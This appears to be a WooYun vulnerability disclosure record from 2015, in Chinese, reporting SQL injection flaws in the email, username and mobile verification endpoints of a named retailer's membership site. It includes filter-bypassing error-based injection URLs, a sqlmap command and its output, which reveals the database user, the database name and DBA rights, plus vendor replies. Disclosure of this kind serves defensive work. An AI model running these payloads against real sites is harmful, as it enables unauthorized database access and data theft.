{"id": 81994, "wybug_id": "wooyun-2015-0152337", "wybug_title": "华润OLE某站2处SQL注入打包（无需登录）", "wybug_corp": "华润OLE", "wybug_author": "goubuli", "wybug_date": "2015-11-06 15:45", "wybug_open_date": "2015-12-25 14:16", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-25：\t细节向公众公开  简要描述： RT有过滤，原来的exp已经被过滤了，需要重新绕过。。。包含一处已经修复的。。。 详细说明：  看了 WooYun: 华润OLE某站SQL注入一枚/管理员信息及至少十多万用户信息泄露 和 WooYun: 华润OLE微信管理平台弱口令导致泄漏近45万用户详细信息（含身份证号、手机号、家庭住址等） 都上首页了，于是自己也挖了挖，希望能上首页。有过滤，原来的exp已经被过滤了，需要重新绕过。。。漏洞站点：\nhttp://www.crvole.com.cn/\nSQL1、==============================================================这个是之前已经修复过的。然后管理员就装了360。\n\n这个SQL注入出在\nhttp://vip.crvole.com.cn/account/verifyEmail?email=1\n今天试了一下貌似真的修复了，试了洞主 @凌零1 的exp已经不能成功。。。\n\n换种方式\nhttp://vip.crvole.com.cn/account/verifyEmail?email=1\" and (select exp(~(select*from(select user())a)))=1 and\"\n成功！\n\nSQL2、==============================================================注入地址：\nhttp://vip.crvole.com.cn/account/verifyUsername?username=\n还是在注册的地方\n\n校验用户名的地方exp:\nhttp://vip.crvole.com.cn/account/verifyUsername?username=testtest\" and exp(~(select*from(select user())x))=1 and\"\n成功得到用户：\ncrvole@192.150.50.181\n\n\n版本：\nhttp://vip.crvole.com.cn/account/verifyUsername?username=testtest\" and exp(~(select*from(select version())x))=1 and\"\n\n\n版本：\n5.5.28\n放到工具跑一下\nsqlmap.py -u \"http://vip.crvole.com.cn/account/verifyUsername?username=testtest\" --batch --dbms=\"MySQL\" --current-user --current-db --is-dba         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150818}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 11:41:10[11:41:10] [INFO] testing connection to the target URL[11:41:11] [INFO] testing if the target URL is stable[11:41:12] [INFO] target URL is stable[11:41:12] [INFO] testing if GET parameter 'username' is dynamic[11:41:12] [WARNING] GET parameter 'username' does not appear dynamic[11:41:12] [INFO] heuristic (basic) test shows that GET parameter 'username' might be injectable (possible DBMS: 'MySQL')[11:41:12] [INFO] testing for SQL injection on GET parameter 'username'for the remaining tests, do you want to include all tests for 'MySQL' extendingprovided level (1) and risk (1) values? [Y/n] Y[11:41:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[11:41:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'[11:41:45] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'[11:42:11] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'[11:42:39] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDERBY or GROUP BY clause (MAKE_SET)'[11:42:49] [WARNING] reflective value(s) found and filtering out[11:43:06] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'[11:43:27] [INFO] GET parameter 'username' seems to be 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)' injectable[11:43:27] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'[11:43:32] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'[11:43:33] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'[11:43:33] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'[11:43:33] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'[11:43:33] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'[11:43:35] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'[11:43:35] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE, HAVING clause (BIGINT UNSIGNED)'[11:43:36] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'[11:43:36] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE, HAVING clause'[11:43:36] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause'[11:43:37] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'[11:43:37] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace'[11:43:37] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'[11:43:37] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'[11:43:37] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINTUNSIGNED)'[11:43:37] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause'[11:43:37] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause(EXTRACTVALUE)'[11:43:37] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause(UPDATEXML)'[11:43:37] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause(BIGINT UNSIGNED)'[11:43:37] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause'[11:43:37] [INFO] testing 'MySQL inline queries'[11:43:37] [INFO] testing 'MySQL > 5.0.11 stacked queries (SELECT - comment)'[11:43:37] [INFO] testing 'MySQL > 5.0.11 stacked queries (SELECT)'[11:43:38] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'[11:43:38] [INFO] testing 'MySQL > 5.0.11 stacked queries'[11:43:38] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'[11:43:38] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'[11:43:39] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SELECT)'[11:43:39] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SELECT)'[11:43:39] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SELECT - comment)'[11:43:39] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SELECT - comment)'[11:43:40] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'[11:43:40] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind'[11:43:40] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (comment)'[11:43:40] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (comment)'[11:43:41] [INFO] testing 'MySQL <= 5.0.11 AND time-based blind (heavy query)'[11:43:41] [INFO] testing 'MySQL <= 5.0.11 OR time-based blind (heavy query)'[11:43:41] [INFO] testing 'MySQL <= 5.0.11 AND time-based blind (heavy query - comment)'[11:43:41] [INFO] testing 'MySQL <= 5.0.11 OR time-based blind (heavy query - comment)'[11:43:42] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (SELECT)'[11:43:42] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (SELECT - comment)'[11:43:42] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'[11:43:42] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'[11:43:43] [INFO] testing 'MySQL AND time-based blind (ELT)'[11:43:43] [INFO] testing 'MySQL OR time-based blind (ELT)'[11:43:43] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'[11:43:44] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'[11:43:44] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'[11:43:44] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'[11:43:44] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'[11:43:44] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace(SELECT)'[11:43:44] [INFO] testing 'MySQL <= 5.0.11 time-based blind - Parameter replace(heavy queries)'[11:43:44] [INFO] testing 'MySQL time-based blind - Parameter replace (bool)'[11:43:44] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'[11:43:44] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'[11:43:44] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'[11:43:44] [INFO] testing 'MySQL <= 5.0.11 time-based blind - ORDER BY, GROUP BY clause (heavy query)'[11:43:44] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'[11:43:44] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'[11:43:44] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found[11:43:50] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'[11:43:55] [INFO] testing 'MySQL UNION query (NULL) - 22 to 40 columns'[11:44:00] [INFO] testing 'MySQL UNION query (random number) - 22 to 40 columns'[11:44:05] [INFO] testing 'MySQL UNION query (NULL) - 42 to 60 columns'[11:44:10] [INFO] testing 'MySQL UNION query (random number) - 42 to 60 columns'[11:44:15] [INFO] testing 'MySQL UNION query (NULL) - 62 to 80 columns'[11:44:20] [INFO] testing 'MySQL UNION query (random number) - 62 to 80 columns'[11:44:25] [INFO] testing 'MySQL UNION query (NULL) - 82 to 100 columns'[11:44:30] [INFO] testing 'MySQL UNION query (random number) - 82 to 100 columns'[11:44:35] [WARNING] in OR boolean-based injections, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval[11:44:35] [INFO] checking if the injection point on GET parameter 'username' is a false positiveGET parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] Nsqlmap identified the following injection point(s) with a total of 706 HTTP(s) requests:---Parameter: username (GET)    Type: boolean-based blind    Title: MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)    Payload: username=-3154\" OR MAKE_SET(6688=6688,2333) AND \"smyH\" LIKE \"smyH---[11:44:36] [INFO] testing MySQL[11:44:37] [INFO] confirming MySQL[11:44:37] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.3.28back-end DBMS: MySQL >= 5.0.0[12:00:32] [INFO] fetching current user[12:00:32] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[12:00:32] [INFO] retrieved: crvole@%current user:    'crvole@%'[12:00:45] [INFO] fetching current database[12:00:45] [INFO] retrieved: crvolecurrent database:    'crvole'[12:00:55] [INFO] testing if current user is DBA[12:00:55] [INFO] fetching current usercurrent user is DBA:    True\n\n\n\n\nbool注入比较慢，不跑数据了。。。@凌零1 这位洞主已经证明了。。。附送SQL3、==============================================================附送疑似SQL，但是未出数据，还望一同修复一下、地址是校验手机号的，没注出数据\nhttp://vip.crvole.com.cn/account/verifyMobile?mobile=15822224444\"\n\n\n试了几种姿势，但是没有数据。。。\n\n   漏洞证明：  \n\n\n\n   修复方案：  过滤   版权声明：转载请注明来源 goubuli@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-11-10 14:14 厂商回复： 不好意思今年才看到，我尝试了这里面所有的都是返回空白页面，是否这几天他们又处理了？ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-11-10 14:39 |    \t\tgoubuli \t\t\t( 普通白帽子  |\t\t\t        Rank:487 漏洞数:97        )\t\t \n  应该是被处理过了。。。修复了就好！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}